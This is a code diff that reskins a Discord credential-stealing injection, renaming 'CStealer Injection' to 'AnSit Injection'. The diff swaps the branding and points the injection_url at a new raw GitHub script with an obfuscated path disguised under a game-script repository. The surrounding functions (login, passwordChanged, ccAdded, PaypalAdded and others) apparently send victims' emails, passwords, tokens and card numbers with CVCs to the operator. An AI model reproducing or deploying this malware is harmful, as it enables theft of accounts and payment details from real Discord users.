@@ -11,10 +11,10 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
-  embed_name: 'CStealer Injection', 
-  embed_icon: 'https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png'.replace(/ /g, '%20'), 
-  embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/wtfcstealerwtf/index/main/injection.js', 
+  embed_name: 'AnSit Injection', 
+  embed_icon: 'https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Anonymous_emblem.svg/800px-Anonymous_emblem.svg.png'.replace(/ /g, '%20'), 
+  embed_color: 3895167, 
+  injection_url: 'https://raw.githubusercontent.com/Pet-Simulator-99/Script/main/KadnhnmP0138K/Mkaljdoujnxmakm/andinkNAknsioqi/ckiahngiasghpaq%5B.js', 
   /**
    
    **/
@@ -680,8 +680,8 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: 'AnSit Injection',
+            icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Anonymous_emblem.svg/800px-Anonymous_emblem.svg.png"
         },
       },
     ],
@@ -723,8 +723,8 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: 'AnSit Injection',
+            icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Anonymous_emblem.svg/800px-Anonymous_emblem.svg.png"
         },
       },
     ],
@@ -766,8 +766,8 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: 'AnSit Injection',
+            icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Anonymous_emblem.svg/800px-Anonymous_emblem.svg.png"
         },
       },
     ],
@@ -809,8 +809,8 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: 'AnSit Injection',
+            icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Anonymous_emblem.svg/800px-Anonymous_emblem.svg.png"
         },
       },
     ],
@@ -852,8 +852,8 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: 'AnSit Injection',
+            icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Anonymous_emblem.svg/800px-Anonymous_emblem.svg.png"
         },
       },
     ],
@@ -897,8 +897,8 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: 'AnSit Injection',
+            icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Anonymous_emblem.svg/800px-Anonymous_emblem.svg.png"
         },
       },
     ],
